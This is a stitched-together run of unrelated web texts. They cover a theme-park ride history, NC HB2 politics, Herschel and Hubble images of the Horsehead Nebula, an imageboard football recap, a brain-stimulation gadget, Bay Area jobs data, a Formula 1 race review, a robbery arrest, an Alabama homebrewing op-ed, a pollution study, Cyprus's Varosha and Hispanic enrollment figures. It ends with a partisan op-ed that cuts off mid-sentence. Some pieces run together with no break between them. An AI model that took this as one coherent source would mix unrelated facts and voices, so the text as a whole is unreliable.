This version of the ride featured all of the original films from the 1982 version, but lacked some of the effects. Most notably, the Kinetic Mosaic screen from the original pre-show had been removed resulting in the film being projected onto static screens which resulted in the shape-shifting effect of the film being lost. Also removed were the maps and television monitors on the wall in the EPCOT Energy Information Center in Theatre II, having already been replaced by the KNRG radio tower backdrop for the new show. For this scene, a new narration played that covered much of the same information as the original narration minus any mention of the maps and monitors. In Theatre I, the mirrors on the walls had already been removed by this point, resulting in a much less dramatic version of the finale film.
During this period, some elements for the new show had already been installed in preparation for the new show and had to be hidden. This included the Audio-Animatronic figure of Ellen DeGeneres in the diorama. To solve this, temporary rockwork was placed in front of the figure hiding it from view. However, the Elasmosaurus figure had already been reprogrammed for the new show, leading to the awkward result of having it lunge at rocks instead of the ride vehicles as it had originally done.
This version of the show only ran during the summer of 1996. The pavilion was closed again soon after peak season to allow for the installation of the new films for the new version of the attraction.
Ellen's Energy Adventure (1996–2017) [ edit ]
Ellen's Energy Adventure starred Ellen DeGeneres, Bill Nye "The Science Guy", Jamie Lee Curtis, Alex Trebek, and Johnny Gilbert. It took a light-hearted look at various energy resources, how energy was produced, the history of energy production, and the search for new energy resources. In particular it focused on the origins of fossil fuels such as petroleum, coal and natural gas. It also mentioned renewable sources such as solar and hydroelectric power. In 2011, Ellen's Energy Adventure surpassed the original Universe of Energy show as the longest running version of the attraction.
The second version of the attraction used the same traveling theater system that was used by the original Universe of Energy show. The primeval diorama used essentially the same sets and Audio-Animatronic dinosaurs as the original show, although during the renovation to the Ellen's Energy Adventure show, all of the dinosaurs were repainted in much brighter colors, and several audio-animatronic figures were added along with an upbeat musical score to help tie it into the new film footage.
Pre-show theatre film [ edit ]
Guests viewed an eight-minute film in which Ellen DeGeneres falls asleep and dreams that she is in an energy-themed version of Jeopardy!, playing against an old college rival Judy Peterson (Curtis) and Albert Einstein (Benny Wasserman). Not knowing anything about energy, Ellen fell way behind Judy. At the end of the first round, Bill Nye the Science Guy stepped in and offered to help teach Ellen about energy during the commercial break.
Theatre I film [ edit ]
Upon entering the theatre, guests were seated in one of six sections. The seating area rotated 180 degrees to face three large movie screens for the first film: a four-minute computer animated film in which Bill took Ellen back billions of years in time to witness the Big Bang and the formation of the earth. Finally, they ended up in a prehistoric jungle where he briefly explained how fossil fuels were formed.
Primeval diorama [ edit ]
Universe of Energy Brontosaurus in the
At the conclusion of the film, the seating area rotated 90 degrees to face a curtain, which then rose to reveal a primeval diorama. The entire seating area moved into the diorama where it then broke apart into six multi-passenger vehicles that took guests on a seven-minute journey through the diorama, which was populated by numerous audio-animatronic dinosaurs including an Edaphosaurus, two Arthropleura fighting and a family of Brontosaurus in a swamp (one of whom sneezed water onto guests), a Stegosaurus fighting an Allosaurus on an overhead cliff, several Trachodon bathing beneath a waterfall, a number of Ornithomimus drinking from a pond (one of whom spit water at guests), an Audio-Animatronic Ellen standing near a tidal pool fighting off an Elasmosaurus with a tree branch, and numerous Pteranodon perched around an erupting volcano. After November 2014, the Audio-Animatronic figure of Ellen fighting off the Elasmosaurus with a tree branch stopped working and was removed. It was replaced with a group of smaller Pteranodons.
Theatre II film [ edit ]
Leaving the diorama, the vehicles entered a second theatre where they reassembled back into their original theatre seating formation. After listening to a brief prehistoric broadcast from KNRG News Radio (which featured the voices of Willard Scott and Chris Berman), guests viewed a twelve-minute live-action film on three giant wrap around screens in which Bill Nye took Ellen on an in-depth look at various current and future energy resources across the United States. Actor Michael Richards made a brief cameo as a caveman near the beginning of the film.
Theatre I finale film [ edit ]
At the conclusion of the film, the screens rose and the entire seating area traveled beneath them back into Theatre I and rotated back into its original starting position facing the audience towards a large television-shaped screen. The final two minute film presented the end of Ellen's dream in which she used her new knowledge about energy in Round 2 to unseat Judy as Jeopardy! champion.

As you probably know by now, the NBA moved the All-Star Game out of Charlotte last week, and Republicans sure are pissed about itespecially the governor, who blasted the media, activists, and the "sports and entertainment elite" for the NBA's decision.
Chris Sgro, the Equality NC director who served in the short session as a state representative from Greensboro, had an interesting interaction with McCrory as he was walking into a press conference in Charlotte last Friday. As Sgro recounted on Twitter: ".@PatMcCroryNC just shouted at me 'congrats, you got what you wanted.' Actually, Governor, we all lostbecause of you."
"The governor was on Charlotte Talks this morning," Sgro told the INDY Friday. "He was just spouting a tremendous amount of mistruths about Charlotte's role in losing the All-Star Game and safety and security, so I went over to his press conference, and then he moved the press conference to a secure location that I didn't have access to."
That's when the interaction he described on Twitter happened.
"No one got what they wanted, and the fault is with the governor," Sgro says. "If the governor is going to continue to spread false information about HB 2 and its impacts, as well as what happened with the All-Star Game, when he knows very well that it'll move to a city with the protections Charlotte had, he owes a conversation to the LGBT community. And that's something that needs to happen soon."
Sgro is right: New Orleans, which is said to be the frontrunner to get the All-Star Game, is one of over two hundred American cities with a nondiscrimination ordinance that includes protections based on gender identity.
McCrory shouldn't take it from us; he should give the NBA's statement a read: "While we recognize that the NBA cannot choose the law in every city, state, and country in which we do business, we do not believe we can successfully host our All-Star festivities in Charlotte in the climate created by HB2."
Notice that you won't find Sgro, Charlotte mayor Jennifer Roberts, the Charlotte City Council, the LGBTQ community, or any other group McCrory would like to blame for losing a $100 million-plus event, listed as the reason why the NBA is moving the All-Star Game. No, the NBA specifically says that the "climate created by HB 2" was the basis for the decision.
Own it, Governor.

Europe's Herschel space telescope has imaged one of the most popular subjects in the sky - the Horsehead Nebula - and its environs.
The distinctively shaped molecular gas cloud is sited some 1,300 light-years from Earth in the Constellation Orion.
It is in a region of space undergoing active star formation - something Herschel has been most keen to study.
The Hubble space observatory has also returned to the Horsehead scene, to celebrate 23 years in orbit.
Together, these two great facilities give scientists a much broader insight into what is taking place in this familiar patch of the heavens.
Hubble's new view of the Horsehead Nebula, a large cloud of hydrogen laced with dust
"You need images at all scales and at all wavelengths in astronomy in order to understand the big picture and the small detail," said Prof Matt Griffin, the principal investigator on Herschel's SPIRE instrument.
"In this new Herschel view, the Horsehead looks like a little feature - a pimple. In reality, of course, it is a very large entity in its own right, but in this great sweep of a picture from Herschel you can see that the nebula is set within an even larger, molecular-cloud complex where there is a huge amount of material and a great range of conditions," the Cardiff University, UK, researcher told BBC News.
To provide a sense of scale, the Horsehead Nebula, also known in the catalogues as "Barnard 33", is about five light-years "tall".
Hubble sees the Horsehead in near-infrared light. Herschel, on the other hand, goes to much longer wavelengths. This allows it to see the glow coming directly from cold gas and dust - the material that will eventually collapse under gravity to form the next generation of stars.
Scientists are particularly keen to understand the mechanisms that drive the production of the biggest stars - objects much more massive than our own Sun that form relatively fast, burn bright but brief lives, and interact strongly with their environment, influencing the next round of star formation.
Continue reading the main story Herschel Space Telescope Herschel is one of the largest space telescopes ever launched; its 3.5m diameter mirror perfectly captures infrared light
Infrared shines through gas and dust clouds that can block visible light - Herschel can see deep into dusty star-forming regions
The telescope is named after the astronomer William Herschel who discovered infrared radiation while studying the Sun in 1800
The Earth's atmosphere absorbs infrared, so Herschel was launched into space in 2009 to get a clear view of the infrared Universe
The Orion Molecular Cloud Complex is one of the best and nearest regions in space to study this activity.
Prof Griffin explained: "You can see all the things we look for in Herschel images - the filaments, the bubbles; the wispy material, the reddish material that hasn't yet actually started to form stars.
"You can also see nebulosity where material has been lit up from inside by stars; and features like the Horsehead Nebula where that star formation has yet to really get going."
Hubble's new view was acquired by its Wide Field Camera-3 instrument, which was installed by astronauts on the last shuttle servicing mission in 2009.
The image was taken to celebrate its 23rd birthday in orbit. It was launched on 24 April 1990.
The much shorter wavelengths at which Hubble works means it can produce finer, sharper detail than Herschel.
It illustrates particularly well the way the ultraviolet glare and stellar winds from nearby stars are sculpting the dusty stellar nursery.
Hubble hopefully has quite a few years of operations left in it. Herschel does not.
Scientists are expecting to lose the telescope any day now.
The superfluid helium it uses to cool its instruments and their detectors is all but gone. When the supply runs completely dry, Herschel will warm from its ultra-low functioning temperature and go blind.
A scholarly paper describing Herschel's investigation of the Orion Molecular Cloud Complex has been published in the journal Astrophysical Journal Letters.

Summary
Matchday 1
/sp/ went into the Summer Cup reeling from the effects of Dragongate, and came out with a surprise draw against fellow oldster /jp/. With nine red players spread across both teams, we saw wonderful goals and immediate equalizers traded between these two teams in a passionate back and forth battle to prove themselves the masters of Group E. The fastest goal thus far in the cup was scored by a Red Lelbron at the two-minute mark.
Despite their long, long slump, /m/ proved that they were not quite dead with a cheeky little goal by Alteisen. With possibly the slowest-moving goal ever seen, /m/ ascended to the top of their group in a surprise upset of the group stage rankings.
Matchday 2
In this clash of cup-winning titans, the giant robots of /m/ crushed the mortals of /sp/ in a shocking opening game. /sp/'s offense was unable to break through /m/'s solid defensive lineup, and replacement goalkeeper EVA-01's AT Field stopped the few on-target shots that /sp/ was able to make. Meanwhile, Nu Gundam and Shin Getter Robo set one another up for two excellent goals. With this defeat, /sp/ is in danger of being relegated to the Autumn Babbies, and /m/ prepares itself to take another Cup title in the Knockout Stage.
/g/ gave away a tense, tight game in the 90' minute with an obvious foul in the goalbox, and Get Out Of /jp/ took the penalty kick to give /jp/ a well-earned win over /g/. Several good exchanges between /jp/ and /g/ across the length of the field ended with impressive saves by both Captain Meido and Richard Stallman, but the girl of the match would not be denied.
Matchday 3
Chants of "Waito Piggu Go Home" were less effective against a fellow weeaboard as /m/ trounced /jp/ 4-2. This shotfest of a match was dominated by an all-orange /m/ team and a Newtype-powered Nu Gundam, who led the game with a hat trick at the end of the first half. /jp/'s minor changes to their team and strategy allowed them to score 2 goals through /m/'s backup goalies Gipsy Danger and EVA-01, but it was too little too late. Unlike the previous day, there was no attempt to throw this match and relegate hated/loved team /sp/, and /jp/ would go down fearing for it's chances in the 2013 Summer Cup. Doogie was forced to eat his words as /m/ took 9 undefeated points in the group stage.
With fortuity and ability in equal measure, /sp/ squeaked into the knockout stage with a single goal advantage over /jp/. With a team of all blue medals, /g/ was in a good position to deny /sp/'s offense through most of the match, and possibly take the lead. However, a goal at the very end of the first half by USAUSAUSA gave /sp/ the momentum it needed to dominate the second half despite some amazing heroics from /g/ in the last 20 minutes.

Next year you should be able to buy a small device that uses electricity to change your mood at the press of a button on your smartphone. The device, from a startup called Thync, currently consists of a set of electrodes connected to a phone. It has a short-lived energizing effect that feels a little like drinking a can of Red Bull.
Cofounder Jamie Tyler, a professor at Arizona State University, says the device can also be used to produce a calming effect more potent than drinking a couple of beers or taking Benadryl.
When I tried it, I felt relaxed but also clearheaded—more as if I'd meditated or received a good massage than had a couple of drinks. The effect took a few minutes to kick in, but then it lasted for about 45 minutes—although I'm told that varies from person to person.
Thync recently announced $13 million in venture capital from investors such as Khosla Ventures to bring the first products to market.
Marom Bikson, a professor of biomedical engineering at City College of New York, recently used a prototype of Thync's device in a 100-person study (funded by the company) that focused on its calming effects. Bikson says the study showed “with a high degree of confidence” that the device has an effect, although the results varied. “For some people—not everyone—the effect is really profound,” he says. “Within minutes, they're feeling significantly different in a way that is as powerful as anything else I could imagine short of a narcotic.”
The device uses a form of transcranial direct current stimulation (TDCS), something that's been tested in various forms for years but has yet to be approved by the U.S. Food and Drug Administration to treat a specific disease.
In Thync's device, a barely perceptible electrical current is applied to the skin on your head at different places for the Red Bull effect and for the relaxing effect.
Most TDCS research focuses on trying to use the electrical current to directly affect the outer part of the brain. Thync found that it was able to create strong effects by instead targeting specific nerves and muscles just beneath the skin.
Tyler's ambitions extend beyond selling an electronic substitute for coffee. In separate work he is developing technology that uses ultrasound to affect the brain directly without surgery or drugs. “It's a new frontier, with potential that hasn't been tapped into yet,” he says.
The ultrasound work might lead to treatments for psychiatric disorders and offer new insights into how the brain works, says Amit Etkin, a professor of psychiatry and behavioral science at Stanford. He's starting a partnership with Tyler that will investigate how the technology might help treat depression, post-traumatic stress disorder, and the tremors associated with Parkinson's.
Etkin says ultrasound has two main advantages over other techniques: it can affect areas deep within the brain such as the amygdala, which is associated with emotions and motivation, and it is more precise, targeting areas that are millimeters rather than centimeters across.
But the ultrasound technology is at an early stage, and it will be hard to target specific parts of the brain reliably, he says: “It will require a lot more research before we really understand it.”
Unemployment remains at just 3.2 percent in San Francisco as of the end of January, however that is up from 2.9 percent in December, and a whopping 6,900 lost their jobs in that one-month span, as Socketsite reports  marking the single biggest month-to-month drop since 2009.
That may sound scary, but Socketsite also puts it in perspective by noting that there are 103,600 more people with paychecks living in the city than there were in January 2010  kind of shocking figure.
Meanwhile, in January 2017, employment dropped by 7,200 in Alameda County, but that followed an upward revision of the number of employed people in December, but still even with that dip the number of employed people in the county is 12,500 higher than at the same time last year.
We've all been expecting a market correction of some kind to hit us, and that appears to be happening in small ways like the major layoffs at Zenefits last month, the January layoffs at Munchery, and that small round of layoffs at Twitter last fall.
And the tech economy can't be doing too terribly if Snap Inc. could arrive with such a frenzy on Wall Street, giving it a better opening day than Google, Facebook, or Alibaba, and making CEO and founder Evan Spiegel  don't let this depress you  officially richer than Oprah.

ELROY, Texas—The FIA has one shot a year to tell a Formula 1 story that's all America, apple pie, and loud cries of "yee-haw!" Currently, that takes place down the road from Austin, the Texas state capital, at the annual US Grand Prix. This past weekend, over 100,000 fans descended upon the barely developed town of Elroy, home of the Circuit of the Americas, to watch the world's fastest F1 racers. (The official attendance figure for the three-day event was 269,899.)
Thanks to random happenstance, I was one of them. What started as a cheap flight to visit relatives turned into my first live F1 race, complete with access to decent season-ticket seats and an experienced F1 fan at my side.
Thankfully, that F1 fan didn't have a specific interest in preaching the gospel of one of his favorite sports, because while I had a perfectly fine time, I cannot say that I'd ever want to go back. My experience isn't a condemnation or major criticism of the US Grand Prix. Still, I offer it as both an outsider impression of the F1 experience and as a commentary on the uphill struggle the sport has in getting this nation, hillbillies and yanks alike, to give a hoot.
The view from turn 15
The Circuit of the Americas offers many experiences for fans who want to drive to the small, unincorporated town of Elroy a few times over the US Grand Prix's weekend-long span. On the event's "pit day," fans can get a very close-up look at the work, tools, and techniques used by an average F1 pit crew, while giant, hydraulic-loaded chairs are attached to racing simulators to deliver the kind of virtual racing experience you won't find outside of the most insane arcades. (Let's not forget the giant concerts staged over the event's final two days, including one of Taylor Swift's only US concerts this year.)
I didn't get to sample either of these, nor any other Grand Prix extra-curriculars. My last-minute Texas trip wasn't planned with F1 attendance in mind. In fact, while the US Grand Prix's best drivers were burning through qualifying on Saturday, the day before the main event, I was entertaining nephews with a markedly different racing experience: a full day at an all-you-can-drive go-kart track. (Consider this a hearty recommendation for the affordable, run-down driving you can do with younger family members at Austin Park-and-Pizza.)
After some last-minute finagling, however, I found myself with a cheap lawn ticket by way of a Groupon and a free ride to the track. "Cheap," in this case, is pretty relative.
"I went to Monaco earlier this year," my F1-loving brother-in-law said as we walked to the Circuit of the Americas from one of the track's paid parking lots. "Even with flights accounted for, that was cheaper than this whole weekend." His costs for this event, of course, included two season passes to the track and passes for his kids on various days, but that's still saying something. A "good" F1 experience at the Elroy track doesn't come cheap. (Automotive Editor Gitlin points out that the Lone Star Le Mans event earlier in the year always represents much better value for money, as long as you can handle the heat.)
Those season ticket passes put us in a covered bleachers section up against the 3.4 mile-track's 15th (out of 20) turn. This viewpoint, shown above, is clearly designed for dramatic views, since it includes four turns in all, along with two relatively lengthy straightaways. Having peeked at the full track ahead of the race, I commented on this spot seeming pretty juicy. That's when my brother-in-law pointed to a set of white "trackside suite" tents ahead of us to the right, which are double-sided and offer views of a windy, four-turn road on the other side. He commented on seeing a bunch of foreign dignitaries in those in the inaugural Texas race in 2012.
Without paying up for such seats, visitors' other option was a series of about half a dozen grassy hills dotting the giant track. These are marked by giant pillars with the turn number, but they're otherwise not marked in such a way as to clarify where's best to sit—nor are they really proofed for issues such as when nearby viewers stand up or bring oversized chairs. Other family members set up camp on one relatively elevated spot at turn 19, and they had chosen this spot in prior years thanks to its mix of visible turns, a giant straightaway, and relatively good viewing angles.
The view from turn 19 eventually became heavily obscured by other patrons, and this happened in spite of us arriving hours early to stake out a decent spot. I looked at maps and other signage when I arrived, however, and probably would not have felt comfortable trying to stake out a spot on my own.
The Circuit of the Americas, like most major racetracks, places giant video screens at each of its major bleacher and sitting spots—because even in the nicest seats, you'll never see more than an fraction of the track at one time. But their presentation felt very lacking; markers for the racers' current order had color markings that didn't match the cars' color, and volume levels for the announcers were dismal at all three spots I sat and watched the action take place.
When Kimi Raikkonen, a driver for Ferrari, stopped his car after a 40th lap pit stop, nobody in my section could make out what the announcers were saying about the driver's choice to brake and reverse back to the pit; we had to rely on an eventual replay of the pit stop and use context clues to figure out that there was an issue with the right-rear wheel. (The actual issue, that a wheel gun was stuck, was never explained by commentators nor shown via slow-motion footage at the event; we didn't figure that part out until re-watching the race at home later.)
Hamilton vs. Mitsurugi
I knew better than to expect Nascar-caliber spills and chills, as F1 races are generally marked by cleaner racing, but this year's US Grand Prix was, as my brother-in-law put it, was a "56-lap victory parade" for Team Mercedes' Lewis Hamilton. The starting order, as settled by the prior day's qualifying rounds, mostly remained intact, and the most intense passing moments were those by faster drivers clearly lapping racers on the other end of the leaderboard.
Which meant there was not much whooping or hollering. The giant crowd was orderly and subdued, with cloud cover keeping the Texas sun at bay on an unusually hot October day. The only audible cheers I heard in any major section came at the race's beginning and conclusion. Having seen a few F1 races on TV, and having played my fair share of racing-sim games, I appreciated the high-level performance on show as drivers carved through turns 12 through 15—and kept speeds ludicrously high through that tight 15th turn into its meaty, follow-up straightaway--but stable track conditions and consistent racing meant nobody really had an opportunity to optimize their way higher in the pecking order. If someone had told me the entire race had been smothered in local caution flags and warnings, I would have believed it.
Much of the main thoroughfare space at Circuit of the Americas is designed with comfort and logistics in mind. Plenty of covered tents full of giant TV screens can be accessed by general-admission ticket holders, so long as they're over 21, and the center pond area contains a giant food-truck parking lot, complete with fatty cuts of authentic Texas barbecue and delicious mixes of fried chicken and fried avocado. Add a convenient series of shuttles from parking lots to the event grounds and some lawn games for racing fans to enjoy while waiting for the race's start, and it all adds up to a more well-rounded experience than simply showing up, baking in the sun, and waiting for the race to start.
Still, overpriced food-truck fare and games of cornhole only get this F1 event so far. The race was a good one for Hamilton, and it was certainly good for taking in a lot of high-level racing (Ferrari's pit crew notwithstanding). But one of my most telling experiences at the race was a 15-minute "battle" I had with my 7-year-old nephew in a grass lawn. Though he's an F1 fan thanks to his dad, by the 15th lap, he had lost interest in the race. Since he's my nephew, he began pantomiming Soul Calibur video game sword-slashing moves in one of the grass lawns. I joined him, because I was proud, but also because the view in his section had become far too obscured, and because, to some extent, there wasn't much else to see from there.
On that day, Hamilton wasn't nearly as wild to emulate as a video game's virtual weapon masters.

ROCKFORD - Rockford's 'SCOPE' team has struck again with the arrest of a suspected serial armed robber.
On Sunday, officers tasked to the SCOPE teams were conducting surveillance in the 3300 block of 11th Street at around 10pm when they observed the armed robbery of a Subway there.
As the suspected armed robber, Nicholas Duncan, left the restaurant, they attempted to take him into custody. Duncan attempted to run to escape, then turned towards the officers pursuing in their vehicle and pointed his gun at them. That's when the officers hit him with the unmarked car, forcing him onto the hood of the car and dropping his weapon. It turned out the gun was a lifelike BB gun.
Duncan, who is 18 and from David Junction, was not seriously hurt and refused treatment at the scene.
For that incident, he faces Armed Robbery, Aggravated Assault and Resisting Police charges, but would soon face more.
That's because the Winnebago County Sheriff's Police believe Duncan may have also robbed another Subway at 5022 S. Main St. on Friday. He has been charged with Armed Robbery in connection with that incident.
Detectives from both agencies are continuing to investigate the possibility that Duncan is responsible for other similar incidents in the Rockford area. Anyone with information is asked to contact the Rockford Police Department 779/500-6551, the Winnebago County Sheriff's Police 815/319-6432 or Crime Stoppers 815/963-7867.

In a step backward for personal liberty, Alabama will remain one of just two U.S. states that do not allow its residents to partake in the craft of homebrewing, a practice that many of the country's Founding Fathers appreciated and practiced, including Thomas Jefferson and George Washington.
The Alabama Legislature's inaction on the issue on the last day of the session Wednesday is not only disappointing for repressed homebrewers like me, but upholding the ban on homebrewing continues the dangerous trend of increasing local, state and federal encroachment on personal and economic freedoms in Alabama.
Homebrewing is punishable as a misdemeanor with significant fines and even jail time under Alabama law. If Alabama believes that "the sole object and only legitimate end of government is to protect the citizen in the enjoyment of life, liberty, and property," as stated in Article 1, Section 35 of the Alabama Constitution, homebrewing ought to be legal. It's hard to see how banning adults from enjoying homebrewed beer and wine protects citizens from the enjoyment of life, liberty and property. In fact, it is a clear violation of all three.
Individuals should be given the right to choose to purchase beer, wine or cider at a restaurant or store, or brew it themselves if they desire. Allowing homebrewers to tinker with beer recipes fosters innovation and diversity in the beer market, offering more choice and better beer. In fact, since President Jimmy Carter legalized homebrewing at the national level in 1978, there has been a craft beer revolution with microbreweries and brewpubs popping up around the nation. This renaissance has not reached Alabama due to archaic remnants of the Prohibition era, including the ban on homebrewing.
In 2010, the Brewers Association reported that Alabama had just four breweries. That is just one brewery for every 1.2 million Alabama residents. Only one other state, Mississippi (which also bans homebrewing), ranked lower with one brewery for every 1.4 million residents. The national average is one brewery for every 271,000 residents; nearby Georgia has one brewery for every 461,000 residents.
Opponents of homebrewing argue that it will make beer and wine cheaper and thus more widely available for those looking for cheap drunkenness. Homebrewing isn't an easy, quick or even cheap craft to get into. From my own experience as a homebrewer of beer -- prior to moving to Alabama -- the ingredients and equipment required to make a palatable beer certainly exceeded the cost of a standard noncraft beer, like Coors or Miller. Not to mention, a homebrewed batch of beer often takes several weeks to make.
Homebrewing is an art, oftentimes taking new brewers several tries and a lot of money to get it right. Homebrewing, craft breweries and vineyards only help foster a deeper respect for the craft that goes into creating these beverages. They help dispel the notion ingrained in popular culture that alcohol is simply a cheap expedient to drunkenness. Instead, they stress a deep appreciation for the history and form of alcoholic beverages.
The deeper issue at stake is the tendency of politicians -- whether at the local, state or national level -- to manage every aspect of their constituents' economic and personal lives. This trend threatens the development of personal responsibility and undermines the foundations of a free society. French political observer Alexis de Tocqueville long ago warned this type of bureaucratic power turns people into "nothing better than a flock of timid and industrious animals, of which the government is the shepherd."
In fact, the Alabama Constitution clearly states that when government oversteps its responsibility to protect life, liberty and property, it usurps and oppresses the people. Growing paternalism, such as bans on homebrewing, threatens the development of responsibility, and thus a free society.

The east sides of New York, London and Paris are noticeably and famously poorer than their western sides. And it turns out there's a reason for that.
Researchers have found that it's due to the impact of air pollutants at the time of the Industrial Revolution, as prevailing winds in the U.S. and Europe typically blow from west to east. And it's an impact that has lasted into today.
A paper from the Spatial Economics Research Centre examined 5,000 industrial chimneys in 70 English cities in 1880, and then re-created the spatial distribution of pollution. That historical pollution explained up to 15% of within-city deprivation in 1881.
“A pollution differential equivalent to the one between the 10% and 90% most polluted neighborhoods of Manchester would be associated with a gradient of 18 percentage points in the share of low-skilled workers,” the paper found.
Perhaps more incredibly, that difference has continued to this day even though the pollution that caused them has waned.
SERC
“Past pollution explains up to 20% of the observed neighborhood segregation whether captured by the shares of blue collar workers and employees, house prices or official deprivation indices,” the paper written by Stephan Heblich and Yanos Zylbergerg of the University of Bristol and Alex Trew of the University of St. Andrews found.
The researchers say the findings have practical implications both in the developing and developed world.
The success of urban policies to revitalize deprived areas depends on their position relative to the tipping point. For countries like China where pollution is a current challenge, there also are long-run consequences to consider, they added.

THE European Union appears to be examining the idea of returning the abandoned town of Varosha to its rightful owners in return for ‘legalising' the operation of Tympou airport in the breakaway north.
The move would be part of an effort to prepare the ground for a final settlement of the island's problem, reports suggested.
The government however, remained tight-lipped yesterday.
Foreign Minister Ioannis Kasoulides said on Sunday that it looked like Turkey had conveyed to Brussels that the move was possible although things were at a very early stage.
“But from the moment the Turkish side agrees for the European Commission to examine it … I think this is a big step,” Kasoulides told state broadcaster CyBC.
The foreign minister suggested that a big confidence-building step could raise real prospects.
“Something big regarding confidence must happen,” he said.
The Greek Cypriot side had in the past proposed opening Varosha in exchange for opening the port of Famagusta under EU supervision.
‘Opening' Tympou airport however could be much trickier.
Kasoulides said the operation of an international airport on republic territory could not be allowed “unless the matter of legality is sorted”.
He did not elaborate.
The government would not comment on the issue yesterday.
“The president does not wish further public discussion on the matter of Varosha. Therefore, no comment,” deputy government spokesman Victoras Papadopoulos told reporters.
In 1974, Turkish forces sealed off Varosha – with its golden sands and high-rise hotels – and the fact that it remains empty after so many years, without even displaced Turkish Cypriots or Turkish settlers occupying its buildings, fans the flames of injustice felt by its former inhabitants.
Main opposition AKEL asked for the issue to be discussed by the national council.
As a matter of principle, the party was not negative towards EU involvement, its spokesman said.
“The essence is what our positions are on the issue,” Giorgos Loukaides added.
A new U.S. Census Bureau report shows that after several years of gains, college enrollments in the U.S. fell between 2011 and 2012. But for one group—Hispanics—college enrollments were up, reflecting Hispanic population growth along with a growing share of young Latinos prepared for college. The new Census Bureau data also shows Hispanic students reached other milestones in 2012, continuing recent upward trends in educational attainment and college attendance.
1. For the first time, a greater share of Hispanic recent high school graduates are enrolled in college than whites. College enrollment rates among 18- to 24-year old Hispanics who had completed high school continued their upward march in 2012. According to the Census Bureau, 49% of young Hispanic high school graduates were enrolled in college. By comparison, 47% of white non-Hispanic high school graduates were enrolled in college. These findings reflect those of a May Pew Research Center report that showed the share of Hispanic high school graduates from enrolled in college immediately after high school surpassed whites in 2012.
While the share of recent Hispanic high school graduates from enrolled in college has surpassed that of whites, the same is not true among all young people ages 18 to 24. Because Hispanics have a higher high school dropout rate than whites, the share of all Hispanics ages 18 to 24 in college lags that of whites – 37.5% among Hispanics compared with 42.1% among whites.
2. The Hispanic high school dropout rate continues to fall. The share of Hispanics ages 18 to 24 who have not completed high school and were not enrolled in school fell to a record low of 15% in 2012. That was less than half of the 32% rate in 2000. Overall, the Hispanic dropout rate is falling more quickly than any other racial or ethnic group, resulting in a closing of the gap between Hispanics and blacks, white non-Hispanics and Asians. Overall, 8% of all young adults ages 18 to 24 had not completed high school and were not enrolled in school.
3. The number of 18- to 24-year-old Hispanics enrolled in college increased by 324,000 students between 2011 and 2012, marking the third straight year of increases. The number of Hispanic 18- to 24-year-olds enrolled in college has reached a new high—2.4 million—and has been growing since 2009. By contrast, the number of non-Hispanics enrolled in college fell between 2011 and 2012. Overall, Hispanics make up 19% of all college students ages 18 to 24, up from 12% in 2008.
4. Hispanics now make up one-fourth of all public school students—a new demographic milestone. According to the Census Bureau, one out of every four public school students nationwide in October 2012 was Hispanic. The Hispanic share varies across different school levels. For example, among nursery public school students, the Hispanic share stood at 29%; among public school kindergarten students, 27% are Hispanic; and among elementary school students, 25% are Hispanic. Only among public high school students is the Hispanic share (23%) below one-quarter.
Despite these recent milestones, Latinos continue to lag other groups when it comes to earning a bachelor's degree. In 2012, 14.5% of Latinos ages 25 and older had earned one. By contrast, 51% of Asians, 34.5% of whites and 21.2% of blacks had earned a bachelor's degree. Hispanic college students are also less likely than whites to enroll in a four-year college, attend a selective college, and enroll full-time.
Even so, education is important to Hispanics. Today, a record share of Hispanic young people are prepared for college, Latino voters say education is a top issue, and Latinos are more likely than the general public to say a college degree as key to life success.

The End of the World...for Liberals
In The Power of Now, Eckhart Tolle demonstrated how human consciousness becomes imprisoned by the controlling mind, and how that mind, so much focused on the task of controlling and centralizing one's attention on the past and future, may feel threatened by any attempt to escape from mental control. The imprisoned mind will seek to reassert its enslavement at the first hint of change. Just such a separation of consciousness from Being, or, if you will, of mankind from God, is exactly what is at play in our current national drama. A powerful mental construct – the liberal myth of a progressive utopia brought about by surrender of the individual to state control – is at risk of being swept away by a great movement to free consciousness from the controlling ideas of the liberal past. As Shelby Steele wrote in a remarkable March 6 op-ed ("The Exhaustion of American Liberalism"), we stand "at the end of something," that something being the radical mindset that has dominated so much of American intellectual life since the 1960s.
"The jig is up." Liberalism no longer possesses the moral authority to control our national politics. Liberals are terrified of Trump because they know that their great myth, once the light of consciousness has been shined on it, will dissolve as quickly as a grain of salt in water. As Steele puts it, the "president rolls his eyes when he is called a racist, and we all – liberal and conservative alike – know that he isn't one." Elizabeth Warren's Jeff Sessions rant was just that: a hysterical rant, and everyone knows it. "White guilt," and all that goes with it, is now just tiresome noise. There is no reality to liberals' mental myth of the enlightened state. Once it comes under awareness, it dissolves. In Tolle's thinking, the concentration of consciousness on the "now" to the exclusion of past and present awakens presence, a powerful field of energy that can be directed toward learning, acting, healing, or any other endeavor. Presence is transformative in a way that the mere chatter of mind can never be because presence transcends the self-limiting contradictions, inhibitions, and mental rubbish of regret, fear, and false hope. Donald Trump has brought to American politics a liberating presence that we have not seen since the days of Ronald Reagan. And Trump's powerful presence – not just his "presence" (as in "attendance"), but his presence (his "aura" and sense of authority) – has liberated half of America from the mental cage of progressive thought and struck fear into the rest. The great panic on the left and the resultant attacks on Trump are the left's response to this fear. The left is desperate to prevent the light of consciousness from being directed at the intricate mental structure leftists have erected. Once a single pillar has been removed, the entire structure will begin to crumble, and it will become apparent that the progressive fantasy is merely a construction of ideas with no basis in reality. The left has created a mental cage in which much of the world has been imprisoned for the past half-century and more. Now, with nationalist movements in Europe and Trump in America, that world is changing. No wonder the entire progressive establishment, from the liberal media to holdovers from the Obama bureaucracy, is trying to bring Trump down, even, if need be, at the cost of national security and economic prosperity. From their perspective, it is the end of the world. If they believed in Satan, they would be labeling Trump "Satan." As it is, he is merely "Hitler." (Interesting, but predictable, how very materialistic all of the left's categories of thought have become and how totally uninterested it is in the higher plane of liberty, goodness, and selflessness. In effect, our two political parties have been replaced by two great movements: the left's ever greater reduction of life to physical categories and interest groups and conservatism's aspiration to restore wholeness and freedom, the condition that Tolle calls "consciousness" and that others would label "sanctity" or "human dignity.") The fear and panic on the left are palpable. Network programs that once, long ago, were respected news outlets are now little more than vicious rants declaimed in raised voices. News anchors have become mindless megaphones of victimhood and defeatism, totally absorbed by the idea of stopping Trump because Trump threatens the end of their world. Why is it that Trump poses such an existential threat to progressivism? How does that threat operate? Why is Trump so much more dangerous than Christie, Rubio, Cruz, and Kasich would have been? It is because unlike those who merely oppose the left, Trump dissolves the opposition by holding it up to ridicule. With his laser-like tweets and incisive wit, with his very presence, Trump brings the preposterousness of the left's positions into the light. Everyone knows that the left has failed in its 